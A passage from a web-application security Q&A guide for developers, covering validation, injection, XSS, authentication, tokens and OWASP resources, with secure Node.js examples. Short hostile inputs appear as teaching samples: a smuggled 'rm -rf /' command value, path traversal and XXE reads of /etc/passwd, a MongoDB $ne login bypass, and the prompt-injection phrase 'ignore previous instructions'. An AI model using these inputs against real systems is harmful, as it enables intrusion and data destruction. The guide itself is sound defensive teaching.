Validation should happen on the server, use an allowlist of what is accepted, and reject anything else. It reduces many attacks, but it does not replace parameterized queries or output encoding.

## 68: What is the difference between allowlist and denylist validation?

An allowlist accepts only known good values, for example "only letters, digits and underscores, 3 to 20 characters". A denylist rejects known bad values, for example "block `<script>`".

Allowlists are much safer. Attackers can almost always find a way around a denylist with encoding tricks, different case or alternate syntax.

## 69: Why is client-side validation not enough?

Client-side validation runs in the user's browser, so the user controls it. They can turn off JavaScript, change the code, or send requests directly to the API. Client-side validation is good for user experience, but the server must validate everything again.

## 70: What is path traversal?

Path traversal (also called directory traversal) happens when user input is used to build a file path, and the attacker uses `../` to go outside the intended folder.

```
GET /download?file=../../../etc/passwd
```

The fix is to avoid using user input in file paths, use IDs that map to files, or resolve the full path and check that it is still inside the allowed folder.

## 71: What is OS command injection?

Command injection happens when user input is put into a shell command. The attacker adds shell characters like `;`, `&&` or `|` to run their own commands.

```js
// Vulnerable
exec(`ping -c 1 ${host}`);
// host = "8.8.8.8; rm -rf /"
```

Avoid the shell when you can. In Node.js, use `execFile` or `spawn` with an array of arguments, and validate the input.

## 72: What is an open redirect?

An open redirect is when your site redirects users to any URL given in a parameter, like `/login?next=https://evil.com`. Attackers use it in phishing, because the link starts with your trusted domain. It can also help steal OAuth tokens. The fix is to only allow relative paths or a fixed list of allowed destinations.

## 73: What is XXE?

XXE (XML External Entity) is an attack on XML parsers that process external entities. The attacker sends XML that defines an entity pointing to a local file or internal URL, and the parser includes its content in the result.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user><name>&xxe;</name></user>
```

The fix is to disable DTDs and external entities in the XML parser. It is grouped under Security Misconfiguration in the current Top 10.

## 74: What is a denial of service (DoS) attack?

A DoS attack tries to make a service unavailable, for example by sending huge numbers of requests, uploading very large files, or sending inputs that take a long time to process. A distributed DoS (DDoS) uses many machines at once. Defenses include rate limiting, request size limits, timeouts, CDNs and DDoS protection services.

## 75: What is rate limiting?

Rate limiting caps how many requests a client can make in a given time, for example 100 requests per minute per IP or per user. It slows down brute force attacks, credential stuffing, scraping and some DoS attacks. When a limit is hit, the server usually responds with `429 Too Many Requests`.

## 76: What is defense in depth?

Defense in depth means using several layers of security, so if one fails, others still protect the system. For XSS, you might use framework escaping, input validation, CSP and `HttpOnly` cookies together. No single control is perfect, so you do not rely on just one.

## 77: What is the attack surface?

The attack surface is everything an attacker can interact with: public endpoints, forms, file uploads, APIs, open ports, third-party integrations, admin panels and so on. The bigger it is, the more places there are to find a weakness. Removing unused endpoints, features and services shrinks the attack surface.

## 78: What is threat modeling?

Threat modeling is a structured way to find security problems in a design before building it. You usually ask four questions:

1. What are we building?
2. What can go wrong?
3. What are we going to do about it?
4. Did we do a good job?

It is the main practice OWASP recommends against Insecure Design.

## 79: What is STRIDE?

STRIDE is a threat modeling method from Microsoft. Each letter is a type of threat:

- Spoofing: pretending to be someone else.
- Tampering: changing data.
- Repudiation: denying you did something.
- Information disclosure: leaking data.
- Denial of service: making the system unavailable.
- Elevation of privilege: getting more access than allowed.

You go through each part of the system and ask which of these could happen.

## 80: What is OWASP ASVS?

ASVS (Application Security Verification Standard) is a detailed list of security requirements for web applications. The current version is 5.0, released in May 2025. Requirements are grouped into three levels:

- Level 1: basic protection, the minimum for any app.
- Level 2: most apps that handle sensitive data.
- Level 3: high-value apps like banking or healthcare.

Teams use ASVS as a checklist for development, testing and procurement.

## 81: What is the OWASP Web Security Testing Guide (WSTG)?

WSTG is OWASP's guide for testing web applications. It describes how to test each area: information gathering, configuration, authentication, authorization, session management, input validation, error handling, cryptography, business logic and client-side code. Each test has an ID like `WSTG-ATHN-03`, which is handy in pentest reports.

## 82: What is the OWASP Cheat Sheet Series?

It is a collection of short, practical guides on specific security topics, like "Password Storage", "Cross Site Scripting Prevention", "Session Management" or "REST Security". They are written for developers and say exactly what to do. When you need to implement something securely, the matching cheat sheet is a good place to start.

## 83: What is ZAP?

ZAP (Zed Attack Proxy) is a free, open source web application security scanner. It was an OWASP project and is now maintained under the Checkmarx brand as "ZAP by Checkmarx". It works as a proxy between your browser and the app, so you can see and change requests. It can also crawl a site and scan it automatically for issues like XSS, SQL injection and missing headers, and it can run in CI pipelines.

## 84: What is Burp Suite?

Burp Suite is a popular tool from PortSwigger for testing web application security. Like ZAP, it acts as a proxy that lets you intercept, view and change HTTP requests. The free Community edition has the manual tools, and the paid Professional edition adds an automated scanner. It is the most common tool used by professional pentesters.

## 85: What is a CVE?

CVE (Common Vulnerabilities and Exposures) is a public list of known vulnerabilities in specific products. Each one gets an ID like `CVE-2021-44228` (Log4Shell). When a security advisory or `npm audit` mentions a CVE, you can look it up to see what is affected and how to fix it.

## 86: What is a CWE?

CWE (Common Weakness Enumeration) is a list of types of software weaknesses, not specific bugs. For example, CWE-79 is XSS and CWE-89 is SQL injection. Each OWASP Top 10 category maps to a group of CWEs. A CVE is one real bug in one product, and a CWE is the kind of mistake behind it.

## 87: What is CVSS?

CVSS (Common Vulnerability Scoring System) gives a vulnerability a severity score from 0.0 to 10.0, based on things like how it can be attacked, how hard it is, and what the impact is. Scores are grouped as Low, Medium, High and Critical. The current version is CVSS 4.0, though many tools still show 3.1 scores. Teams use the score to decide what to fix first.

## 88: What is penetration testing?

Penetration testing (pentesting) is when security testers try to attack a system the way a real attacker would, with permission, to find vulnerabilities. Unlike automated scanners, a pentester can chain small issues together and find business logic flaws. Results go into a report with the issues, their severity and how to fix them.

## 89: What is the difference between SAST, DAST and SCA?

- SAST (Static Application Security Testing) scans source code without running it. Examples: Semgrep, CodeQL, SonarQube.
- DAST (Dynamic Application Security Testing) tests the running app from the outside by sending requests. Examples: ZAP, Burp Suite.
- SCA (Software Composition Analysis) checks your dependencies for known vulnerabilities and license issues. Examples: npm audit, Dependabot, Snyk.

They find different problems, so teams usually use all three.

## 90: What is a security header?

A security header is an HTTP response header that tells the browser to turn on a protection. The most common ones are:

- `Content-Security-Policy`
- `Strict-Transport-Security`
- `X-Content-Type-Options`
- `Referrer-Policy`
- `Permissions-Policy`
- `Cross-Origin-Opener-Policy`

They are cheap to add and block whole classes of attacks.

## 91: What is Helmet in Express?

Helmet is an npm package that sets a group of security headers in Express apps with one line. It sets a default CSP, HSTS, `X-Content-Type-Options`, `Referrer-Policy` and others, and removes `X-Powered-By`.

```js
import express from "express";
import helmet from "helmet";

const app = express();
app.use(helmet());
```

You will usually need to adjust the CSP to fit your app.

## 92: Why should you remove the X-Powered-By header?

`X-Powered-By: Express` tells everyone which framework you use. It does not help users, but it helps attackers pick which exploits to try. Removing it does not make the app secure on its own, but there is no reason to give away free information.

```js
app.disable("x-powered-by");
```

## 93: What is sensitive data?

Sensitive data is anything that would cause harm if leaked: passwords, session tokens, API keys, credit card numbers, health records, government IDs, home addresses, and personal data covered by laws like GDPR. Knowing which data is sensitive tells you where to put encryption, access control and logging limits.

## 94: What is a secret in the context of application security?

A secret is any value that gives access to something: API keys, database passwords, private keys, OAuth client secrets, JWT signing keys and so on. Secrets should never be in source code or Git history. They belong in environment variables loaded from a secrets manager like AWS Secrets Manager, HashiCorp Vault or your platform's secret store.

## 95: What should you do if a secret is committed to Git?

Treat it as leaked. Rotate it right away: create a new key and revoke the old one. Removing the commit is not enough, because the secret is still in history, forks, clones and possibly in bots that scan GitHub within minutes. After rotating, you can clean the history with a tool like `git filter-repo`, and add secret scanning to stop it from happening again.

## 96: What is a JWT?

A JWT (JSON Web Token) is a compact token made of three Base64URL parts separated by dots: a header, a payload with claims, and a signature.

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9.signature
```

The signature proves the token was created by someone with the key and was not changed. The payload is only encoded, not encrypted, so anyone can read it. Never put secrets in it.

## 97: Can you trust the data in a JWT payload?

Only after you verify the signature with the right key and algorithm, and check claims like `exp` (expiry), `iss` (issuer) and `aud` (audience). Decoding without verifying, for example with `jwt.decode()` instead of `jwt.verify()`, means you trust whatever the user sends.

## 98: What is OAuth 2.0?

OAuth 2.0 is a framework that lets a user give an app limited access to their data on another service without sharing their password. For example, "Allow this app to read your Google Calendar". The app gets an access token with specific scopes. OAuth is about authorization. For login, you use OpenID Connect, which is built on top of OAuth.

## 99: What is OpenID Connect (OIDC)?

OIDC is an identity layer on top of OAuth 2.0. It adds an ID token (a JWT) that tells the app who the user is, plus a standard user info endpoint. "Sign in with Google" and "Sign in with Microsoft" use OIDC.

## 100: What is the difference between an access token and a refresh token?

An access token is sent with API requests to prove the client is allowed to call them. It should be short-lived, like 5 to 15 minutes.

A refresh token is used only to get new access tokens when the old one expires. It lives longer, so it must be stored more carefully and should be rotated on each use. If an access token leaks, the damage is limited by its short lifetime.

## 101: Where should you store tokens in a browser app?

There is no perfect place, but the common advice is:

- Session IDs or tokens in `HttpOnly`, `Secure`, `SameSite` cookies are the safest from XSS theft.
- `localStorage` and `sessionStorage` can be read by any script on the page, so an XSS bug can steal tokens stored there.
- Memory (a JavaScript variable) is lost on page reload but is harder to steal.

For many SPAs, a backend-for-frontend (BFF) that keeps tokens on the server and gives the browser only a session cookie is the safest pattern.

## 102: What is the difference between stateful and stateless authentication?

Stateful authentication stores session data on the server, and the client holds only a session ID. You can log a user out instantly by deleting the session.

Stateless authentication puts all needed info in a signed token like a JWT, so the server does not need to look anything up. It scales easily, but you cannot easily revoke a token before it expires. That is why stateless tokens should be short-lived.

## 103: What happens on logout in a secure app?

The server should invalidate the session (delete it from the session store), not just clear the cookie in the browser. It should also clear the cookie, revoke refresh tokens, and for OIDC, optionally end the session at the identity provider. If the server only removes the cookie on the client, a stolen copy of the session ID still works.

## 104: What is session timeout?

Session timeout ends a session after some time so a stolen or forgotten session cannot be used forever. There are two kinds:

- Idle timeout: ends the session after a period of no activity, like 15 to 30 minutes for sensitive apps.
- Absolute timeout: ends the session after a fixed time no matter what, like 8 or 24 hours.

## 105: What is a password policy?

A password policy defines what passwords are allowed. Current guidance from NIST and OWASP:

- At least 8 characters, and 15 or more is better when the password is the only factor.
- Allow long passwords (at least 64 characters) and all characters, including spaces and Unicode.
- Check new passwords against lists of breached and common passwords.
- Do not force composition rules like "one uppercase, one symbol".
- Do not force regular password changes unless there is a sign of compromise.

## 106: Why are forced periodic password changes discouraged now?

When people are forced to change passwords every 90 days, they pick weak, predictable patterns like `Summer2025!` then `Autumn2025!`. NIST guidance says to require a change only when there is evidence the password was compromised. Length, breach checks and MFA do more good.

## 107: What is phishing?

Phishing is tricking people into giving away credentials or running malware, usually through fake emails, messages or websites that look real. Developers can reduce its impact with MFA, especially phishing-resistant methods like passkeys and hardware keys, and by avoiding open redirects that make fake links look trustworthy.

## 108: What is social engineering?

Social engineering is manipulating people instead of breaking technology. Examples are calling the help desk pretending to be a user who lost their phone, or posing as IT to get someone's password. Secure processes, like proper identity checks for account recovery, are the defense. It matters for app design because account recovery flows are a common target.

## 109: What is user enumeration?

User enumeration is when an attacker can find out which usernames or emails exist in your system. It usually happens through different messages like "User not found" vs "Wrong password", or different response times. The fix is to return the same message for both cases, such as "Invalid email or password", and to make response times similar.

## 110: What is a security misconfiguration in the cloud?

Common examples are public S3 buckets, open security groups allowing `0.0.0.0/0` on database ports, IAM roles with `*` permissions, disabled logging, and unencrypted storage. Many big data leaks came from misconfigured cloud storage, not from hacking the app itself.

## 111: What is the difference between a public and private S3 bucket?

A private bucket only allows access to identities with the right IAM permissions. A public bucket lets anyone on the internet read (or sometimes write) its objects. AWS now blocks public access by default on new buckets, and you should keep "Block Public Access" turned on unless the bucket is meant to serve public files, like a static site.

## 112: What is a directory listing vulnerability?

When a web server has directory listing enabled and there is no index file, it shows a list of all files in the folder. Attackers can browse it to find backups, config files, source code or uploads. Directory listing should be disabled on production servers.

## 113: What are default credentials?

Default credentials are the usernames and passwords that come with software or devices out of the box, like `admin/admin`. They are publicly known, and attackers scan the internet for systems that still use them. Always change or remove them during setup.

## 114: What is a web application firewall (WAF)?

A WAF sits in front of your app and filters HTTP traffic, blocking requests that match known attack patterns like SQL injection or XSS payloads. Examples are AWS WAF, Cloudflare WAF and ModSecurity with the OWASP Core Rule Set. A WAF is a useful extra layer, but it can be bypassed and does not replace fixing the code.

## 115: What is the OWASP Core Rule Set?

The OWASP Core Rule Set (CRS) is a set of generic attack detection rules for WAFs like ModSecurity and Coraza. It covers SQL injection, XSS, local file inclusion, remote code execution and other common attacks. It has paranoia levels to balance protection against false positives.

## 116: What is remote code execution (RCE)?

RCE means an attacker can run their own code on your server. It is usually the most serious kind of vulnerability, since it can lead to full control of the system. It can come from command injection, unsafe deserialization, template injection, file upload bugs or vulnerable dependencies like Log4Shell.

## 117: What is a file upload vulnerability?

File upload features can be abused in many ways:

- Uploading a script (like `.php` or `.jsp`) that the server then runs.
- Uploading HTML or SVG with JavaScript, causing stored XSS.
- Uploading huge files to fill the disk.
- Using the filename for path traversal.

Defenses: check the file type by content, rename files, store them outside the web root or in object storage, set size limits and serve them with the right `Content-Type`.

## 118: What is sensitive data exposure in URLs?

Putting tokens, passwords or personal data in URLs is risky, because URLs end up in browser history, server logs, proxy logs, analytics tools and the `Referer` header sent to other sites. Send sensitive values in the request body or headers instead.

## 119: What is the Referrer-Policy header?

`Referrer-Policy` controls how much of the current URL is sent in the `Referer` header when the user goes to another page or the page loads resources. `strict-origin-when-cross-origin` is the browser default and a good choice: it sends the full URL for same-origin requests and only the origin for cross-origin ones.

```http
Referrer-Policy: strict-origin-when-cross-origin
```

## 120: What is the Permissions-Policy header?

`Permissions-Policy` lets you turn off browser features your site does not use, like the camera, microphone or geolocation, for your page and any iframes on it. It limits what an attacker can do through XSS or a malicious third-party script.

```http
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

## 121: What is Subresource Integrity (SRI)?

SRI lets you add a hash of a script or stylesheet to the tag that loads it. The browser downloads the file, hashes it, and refuses to run it if the hash does not match. This protects you if a CDN gets hacked or the file is changed.

```html
<script
  src="https://cdn.example.com/lib@1.2.3/lib.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>
```

## 122: What is a man-in-the-middle (MITM) attack?

In a MITM attack, someone sits between the user and the server and can read or change the traffic. It is easy on public Wi-Fi when the connection is plain HTTP. HTTPS with valid certificates, plus HSTS, prevents it.

## 123: What is a digital certificate?

A TLS certificate links a domain name to a public key and is signed by a Certificate Authority (CA) that browsers trust. When you connect to a site, the browser checks that the certificate is valid, not expired, issued for that domain and signed by a trusted CA. Let's Encrypt gives free certificates and is widely used.

## 124: What is a digital signature?

A digital signature proves who created some data and that it was not changed. The signer uses their private key to sign, and anyone with the public key can verify. Signatures are used in JWTs (with RS256 or ES256), TLS certificates, signed software packages and Git commits.

## 125: What is HMAC?

HMAC (Hash-based Message Authentication Code) combines a secret key with a hash function, like HMAC-SHA256, to create a tag for a message. Only someone with the key can create or check the tag. It is used to sign JWTs with HS256, to verify webhooks, and to protect cookies from tampering.

```js
import { createHmac } from "node:crypto";

const tag = createHmac("sha256", process.env.WEBHOOK_SECRET)
  .update(rawBody)
  .digest("hex");
```

## 126: Why should you not use Math.random() for security?

`Math.random()` is not cryptographically secure. Its output can be predicted if an attacker sees enough values. For tokens, IDs, password reset codes or anything security related, use a secure random generator.

```js
import { randomBytes, randomUUID } from "node:crypto";

const token = randomBytes(32).toString("hex");
const id = randomUUID();

// In the browser
const bytes = crypto.getRandomValues(new Uint8Array(32));
```

## 127: What is a security bug bounty program?

A bug bounty program pays outside security researchers for finding and reporting vulnerabilities in your product. Platforms like HackerOne and Bugcrowd run many of them. It gives you more testers than you could hire, as long as you have a clear scope and a process to fix reports quickly.

## 128: What is a security.txt file?

`security.txt` is a standard file (RFC 9116) at `/.well-known/security.txt` that tells researchers how to report vulnerabilities to you.

```
Contact: mailto:security@example.com
Expires: 2027-01-01T00:00:00.000Z
Policy: https://example.com/security-policy
Preferred-Languages: en
```

## 129: What is responsible disclosure?

Responsible disclosure (also called coordinated disclosure) means a researcher who finds a vulnerability reports it privately to the vendor first and gives them time to fix it, usually 90 days, before making it public. It protects users while still pushing vendors to fix issues.

## 130: What is a zero-day vulnerability?

A zero-day is a vulnerability that is being exploited or is publicly known before the vendor has released a fix. The name means the vendor had zero days to prepare. Defense in depth, monitoring and quick patching are the main ways to limit the damage.

## 131: What is the shift-left approach to security?

Shift left means moving security work earlier in the development process: threat modeling during design, linters and SAST in the editor and pull requests, dependency checks on every build. Bugs found early are much cheaper to fix than bugs found in production or by attackers.

## 132: What is DevSecOps?

DevSecOps adds security into DevOps, so it is part of the daily workflow instead of a separate step at the end. In practice it means automated security checks in CI/CD (SAST, SCA, secret scanning, container scanning, DAST), security as code, and shared responsibility between developers, ops and security teams.

## 133: What is a security champion?

A security champion is a developer on a team who has extra interest and training in security. They help review designs and code, spread knowledge, and act as a link between the team and the security group. OWASP has a Security Champions guide for setting this up.

## 134: What is OWASP SAMM?

SAMM (Software Assurance Maturity Model) is an OWASP framework for measuring and improving how well an organization builds secure software. It covers governance, design, implementation, verification and operations, with maturity levels for each practice. It answers "how mature is our security program?" rather than "is this app secure?".

## 135: What is OWASP Juice Shop?

Juice Shop is a deliberately insecure web app made by OWASP for learning and practice. It is built with Node.js, Express and Angular, and contains over 100 challenges covering the OWASP Top 10 and more. It is a common way to practice finding and exploiting vulnerabilities safely.

## 136: What is the OWASP API Security Top 10?

It is a separate Top 10 list focused on APIs. The latest version is from 2023:

1. Broken Object Level Authorization
2. Broken Authentication
3. Broken Object Property Level Authorization
4. Unrestricted Resource Consumption
5. Broken Function Level Authorization
6. Unrestricted Access to Sensitive Business Flows
7. Server Side Request Forgery
8. Security Misconfiguration
9. Improper Inventory Management
10. Unsafe Consumption of APIs

## 137: What is BOLA?

BOLA (Broken Object Level Authorization) is number one in the API Security Top 10. It is the API name for IDOR: an endpoint takes an object ID and returns or changes the object without checking that the caller is allowed to access it. Every endpoint that takes an ID needs an ownership or permission check.

## 138: What is the OWASP Top 10 for LLM Applications?

It is an OWASP list of the main risks in apps built with large language models. The 2025 version includes prompt injection, sensitive information disclosure, supply chain risks, data and model poisoning, improper output handling, excessive agency, system prompt leakage, vector and embedding weaknesses, misinformation and unbounded consumption.

## 139: What is prompt injection?

Prompt injection is when input to an LLM contains instructions that override what the developer intended. Direct injection comes from the user ("ignore previous instructions..."). Indirect injection hides instructions in content the model reads, like a web page, email or document. It is the top risk in the OWASP LLM Top 10, and there is no complete fix, so you limit what the model is allowed to do.

## 140: What is a security incident?

A security incident is any event that harms or threatens the confidentiality, integrity or availability of a system or data. Examples: a data breach, ransomware, a compromised account, a leaked secret or a defaced website. Having an incident response plan ready before it happens makes a big difference.

## 141: What is an audit log?

An audit log records who did what and when, especially for security-relevant actions: logins, permission changes, data exports, deletions and admin actions. It helps you investigate incidents and meet compliance rules. Audit logs should be protected from tampering and kept for a defined period.

## 142: What should not be written to logs?

- Passwords, even wrong ones.
- Session IDs, access tokens and API keys.
- Full credit card numbers and CVV codes.
- Encryption keys.
- Sensitive personal data unless it is really needed and protected.

Logs are often less protected than databases and are shipped to many tools, so they leak easily.

## 143: What is log injection?

Log injection is when an attacker puts special characters, like newlines, into input that gets logged, so they can create fake log lines or break log parsers. For example, a username of `admin\nINFO Login success for admin`. Using structured logging (JSON) and encoding newlines prevents this.

## 144: What is the difference between a vulnerability scan and a penetration test?

A vulnerability scan is automated. A tool checks for known issues, outdated software and common misconfigurations. It is fast and can run often, but it gives false positives and misses logic flaws.

A penetration test is done by people who think like attackers, chain issues together and test business logic. It is slower and more expensive, so it is done less often, like once a year or before big releases.

## 145: What is a false positive in security scanning?

A false positive is when a tool reports a vulnerability that is not real, for example flagging a query as SQL injection when it is already parameterized. Too many false positives make developers ignore the tool. Tuning rules, suppressing confirmed false positives with a note, and focusing on high-confidence findings help.

## 146: What is security through obscurity?

Security through obscurity means relying on secrecy of the design or code as the main protection, like hiding an admin page at `/secret-admin-123` without authentication. It is not real security, because the secret can be found. Obscurity can be an extra layer, but the system must stay secure even if attackers know how it works.

## 147: What is the zero trust model?

Zero trust means no user, device or service is trusted just because it is inside the network. Every request is authenticated and authorized, access is limited to what is needed, and activity is monitored. It replaced the old "castle and moat" idea where everything inside the firewall was trusted.

## 148: What is a CAPTCHA and when should you use it?

A CAPTCHA is a test to tell humans from bots, like picking images or a checkbox that analyzes behavior. It helps on login, signup and contact forms that bots abuse. Use it after suspicious behavior (several failed logins) rather than everywhere, since it hurts accessibility and user experience, and modern bots can solve many CAPTCHAs.

## 149: What is data minimization?

Data minimization means collecting and keeping only the data you really need. Data you do not store cannot leak. For example, do not store full card numbers if a payment provider can store them, delete old logs and accounts after a retention period, and do not ask for a birth date if you only need to know the user is over 18.

## 150: What are the most important security habits for a web developer?

- Never trust input, and validate it on the server.
- Use parameterized queries and framework escaping.
- Check authorization on every request.
- Keep dependencies updated.
- Keep secrets out of code.
- Use HTTPS and secure cookie settings.
- Log security events, not sensitive data.
- Handle errors without leaking details and fail closed.
- Read the OWASP Cheat Sheets for anything you are unsure about.

# Moderate Questions (151-300)

## 151: How do you prevent IDOR in an Express and Prisma API?

Scope every query to the current user, so a record that is not theirs is simply not found.

```js
app.get("/invoices/:id", requireAuth, async (req, res) => {
  const invoice = await prisma.invoice.findFirst({
    where: { id: req.params.id, ownerId: req.user.id },
  });
  if (!invoice) return res.status(404).json({ error: "Not found" });
  res.json(invoice);
});
```

Returning `404` instead of `403` also avoids telling the attacker that the ID exists. Using random IDs like UUIDs makes guessing harder, but it is not a replacement for the check.

## 152: How do you implement role-based access control (RBAC) in Express?

Write a small middleware that checks the user's role and use it on routes.

```js
function requireRole(...roles) {
  return (req, res, next) => {
    if (!req.user) return res.status(401).end();
    if (!roles.includes(req.user.role)) return res.status(403).end();
    next();
  };
}

app.delete("/users/:id", requireAuth, requireRole("admin"), deleteUser);
```

The role must come from the server (session or verified token), never from a header or body field sent by the client.

## 153: What is the difference between RBAC, ABAC and ReBAC?

- RBAC (role-based): permissions are tied to roles like `admin` or `editor`. Simple, but gets messy when you need many special cases.
- ABAC (attribute-based): rules use attributes of the user, resource and context, like "editors can edit documents in their own department during work hours".
- ReBAC (relationship-based): access depends on relationships, like "you can view this file if you are a member of the folder's team". Google Zanzibar and tools like OpenFGA and SpiceDB use this model.

Many real apps mix RBAC for broad roles with ownership or relationship checks for specific records.

## 154: What is mass assignment?

Mass assignment happens when an app takes the request body and saves it straight into a model. The attacker adds extra fields like `role` or `isAdmin`.

```js
// Vulnerable
await prisma.user.update({ where: { id: req.user.id }, data: req.body });
// body: { "name": "Bob", "role": "admin" }
```

Fix it by picking only allowed fields, ideally with a schema.

```js
const UpdateProfile = z.object({
  name: z.string().max(100),
  bio: z.string().max(500),
});
const data = UpdateProfile.parse(req.body);
await prisma.user.update({ where: { id: req.user.id }, data });
```

In the API Security Top 10 this falls under Broken Object Property Level Authorization.

## 155: How do you avoid leaking extra fields in API responses?

Do not return whole database objects. Pick the fields to send, either with `select` in the query or with a response mapper.

```js
const user = await prisma.user.findUnique({
  where: { id },
  select: { id: true, name: true, avatarUrl: true },
});
```

Otherwise fields like `passwordHash`, `email`, `resetToken` or internal flags end up in the JSON, even if the UI never shows them.

## 156: How do you validate request input with Zod in Express?

Define a schema and parse the input before using it. `safeParse` returns a result instead of throwing.

```js
import { z } from "zod";

const CreateUser = z.object({
  email: z.email(),
  age: z.number().int().min(13).max(120),
  name: z.string().trim().min(1).max(80),
});

app.post("/users", (req, res) => {
  const result = CreateUser.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ errors: result.error.issues });
  }
  createUser(result.data);
  res.status(201).end();
});
```

Zod objects strip unknown keys by default, which also helps with mass assignment.

## 157: How do you hash passwords with Argon2 in Node.js?

Use the `argon2` package. It uses Argon2id by default and stores the salt and parameters inside the hash string.

```js
import argon2 from "argon2";

const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 19456, // 19 MiB
  timeCost: 2,
  parallelism: 1,
});

const ok = await argon2.verify(hash, passwordFromLogin);
```

The parameters above match the OWASP minimum recommendation for Argon2id.

## 158: How do you hash passwords with bcrypt and what are its limits?

```js
import bcrypt from "bcrypt";

const hash = await bcrypt.hash(password, 12); // cost factor
const ok = await bcrypt.compare(passwordFromLogin, hash);
```

Use a cost of at least 10, and higher if your servers can handle it. bcrypt only uses the first 72 bytes of the input, so very long passwords get cut off. Some implementations also stop at a null byte. Do not pre-hash with a fast hash and hex encoding unless you understand the issues. For new projects, Argon2id is the better choice.

## 159: What is a pepper and how is it different from a salt?

A salt is random per password and stored next to the hash in the database. A pepper is one secret value shared by all passwords and stored somewhere else, like a secrets manager or HSM. If only the database leaks, the attacker cannot crack hashes without the pepper. A common way is to HMAC the password hash with the pepper, or encrypt the hash with a key. It is an extra layer, not a requirement.

## 160: How do you upgrade old password hashes without forcing a reset?

When a user logs in successfully, you have the plain password for a moment. Check it against the old hash, and if it matches, hash it with the new algorithm and save that.

```js
if (user.hashAlgo === "sha1") {
  if (sha1(password + user.salt) === user.hash) {
    user.hash = await argon2.hash(password);
    user.hashAlgo = "argon2id";
    await save(user);
  }
}
```

For users who do not log in, you can wrap the old hash inside the new one (`argon2(sha1hash)`) so every stored hash is strong right away.

## 161: How do you prevent SQL injection when the table or column name comes from the user?

Placeholders work only for values, not for identifiers like table names, column names or `ORDER BY` direction. Map the input to a fixed list of allowed values.

```js
const SORT_COLUMNS = { name: "name", created: "created_at", price: "price" };
const column = SORT_COLUMNS[req.query.sort] ?? "created_at";
const dir = req.query.dir === "asc" ? "ASC" : "DESC";

const { rows } = await pool.query(
  `SELECT id, name, price FROM products ORDER BY ${column} ${dir} LIMIT $1`,
  [20],
);
```

## 162: Can an ORM still be vulnerable to SQL injection?

Yes. ORMs are safe when you use their normal query builders, but most have raw query functions. In Prisma, `$queryRaw` with a tagged template is parameterized, but `$queryRawUnsafe` with string building is not.

```js
// Safe: values become parameters
await prisma.$queryRaw`SELECT * FROM users WHERE email = ${email}`;

// Unsafe
await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE email = '${email}'`);
```

Sequelize `literal()`, TypeORM `query()` with string concatenation and Knex `raw()` with interpolation have the same risk.

## 163: What is NoSQL injection in MongoDB?

If you pass request data directly into a query, an attacker can send an object with operators instead of a string.

```js
// Vulnerable
const user = await User.findOne({
  email: req.body.email,
  password: req.body.password,
});
// body: { "email": "admin@site.com", "password": { "$ne": null } }
```

`{ $ne: null }` matches any password, so the attacker logs in. Fix it by validating types (make sure values are strings), using schema validation, and enabling Mongoose's `sanitizeFilter` option, which wraps such objects in `$eq`.

## 164: Is the $where operator in MongoDB dangerous?

Yes. `$where` runs JavaScript on the database server. If user input reaches it, the attacker can run their own code there, slow down the database or read data. Avoid `$where` and `mapReduce` with user input. You can also disable server-side JavaScript with the `security.javascriptEnabled: false` setting.

## 165: How do you safely run a system command with user input in Node.js?

Use `execFile` or `spawn` with an argument array, so no shell parses the input. Also validate the input.

```js
import { execFile } from "node:child_process";

if (!/^[a-zA-Z0-9.-]{1,253}$/.test(host)) throw new Error("Invalid host");

execFile("ping", ["-c", "1", host], (err, stdout) => {
  // ...
});
```

Avoid `exec` and `spawn` with `shell: true`. Also watch for argument injection: input that starts with `-` can be read as an option, so put `--` before user arguments when the tool supports it.

## 166: How do you prevent path traversal in Node.js?

Resolve the full path and check that it is still inside the allowed folder.

```js
import path from "node:path";

const BASE = path.resolve("uploads");

function safePath(name) {
  const full = path.resolve(BASE, name);
  if (!full.startsWith(BASE + path.sep)) {
    throw new Error("Invalid path");
  }
  return full;
}
```

Even better, store files under generated IDs and keep the original name only in the database.

## 167: How do you safely render user HTML in React?

Avoid it if you can. If you must show user HTML, like rich text from an editor, sanitize it with DOMPurify before using `dangerouslySetInnerHTML`.

```jsx
import DOMPurify from "dompurify";

function Comment({ html }) {
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

Sanitize when rendering, not only when saving, so a bug in one input path does not leave stored payloads in the database.

## 168: Can XSS happen in React even without dangerouslySetInnerHTML?

Yes. Common cases:

- `javascript:` URLs in links: `<a href={user.website}>`. React warns about these but older versions render them. Validate that URLs start with `http:` or `https:`.
- Direct DOM access with refs: `ref.current.innerHTML = value`.
- Server-side rendering that puts JSON into a `<script>` tag without escaping `</script>`.
- Third-party libraries that render HTML.
- Spreading user-controlled objects into props, like `<div {...userProps} />`.

## 169: How does Angular protect against XSS?

Angular treats all values as untrusted by default. Interpolation `{{ }}` escapes text, and bindings like `[innerHTML]`, `[href]` and `[style]` are sanitized for their context. If something unsafe is removed, Angular logs a warning in dev mode.

```ts
// Only do this for content you fully trust
this.html = this.sanitizer.bypassSecurityTrustHtml(trustedHtml);
```

Calling `bypassSecurityTrust*` on user input turns the protection off and creates an XSS hole.

## 170: What are common DOM-based XSS sinks?

Sinks are places where data is turned into code or HTML:

- `innerHTML`, `outerHTML`, `insertAdjacentHTML`
- `document.write`
- `eval`, `new Function`, `setTimeout` and `setInterval` with a string
- `element.setAttribute('onclick', ...)` and other event handler attributes
- `location.href` or `a.href` with a `javascript:` URL
- jQuery `$(html)`, `.html()`, `.append()` with strings

Common sources are `location.hash`, `location.search`, `document.referrer`, `postMessage` data and `localStorage`. Use `textContent` instead of `innerHTML` when you only need text.

## 171: How do you set up a strict CSP with nonces?

Generate a new random nonce on every response, add it to the header and to each script tag you trust.

```js
import crypto from "node:crypto";

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString("base64");
  res.setHeader(
    "Content-Security-Policy",
